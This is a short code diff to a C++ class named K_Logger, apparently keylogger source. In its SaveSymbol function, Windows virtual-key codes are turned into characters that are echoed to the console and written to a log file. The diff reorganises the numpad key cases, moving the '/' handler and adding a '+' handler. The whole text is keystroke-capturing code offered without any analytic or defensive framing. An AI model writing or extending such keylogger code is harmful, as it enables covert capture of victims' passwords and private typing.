@@ -587,6 +587,9 @@ int K_Logger::SaveSymbol(WORD iKey)
 			WriteToFile("0");
 			break;
 
+
+		//+-+-+-+-+-+All figures below are NUMPAD-+-+-+-+-+
+		//+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 		case 0x61:
 			std::cout << "1";
 			WriteToFile("1");
@@ -647,6 +650,20 @@ int K_Logger::SaveSymbol(WORD iKey)
 			WriteToFile("*");
 			break;
 
+		case 0x6F:
+			std::cout << "/";
+			WriteToFile("/");
+			break;
+
+		case 0x6B:
+			std::cout << "+";
+			WriteToFile("+");
+			break;
+    	//+-+-+-+-+-+-+-+--+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+	   //+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+
+
+
 		case 0x5B:
 			std::cout << "Left_Win";
 			WriteToFile("Left_Win");
@@ -666,11 +683,6 @@ int K_Logger::SaveSymbol(WORD iKey)
 		case 0x09:
 			std::cout << " *TAB* ";
 			WriteToFile(" *TAB* ");
-			break;
-
-		case 0x6F:
-			std::cout << "/";
-			WriteToFile("/");
 			break;
 
 		case 0x04:
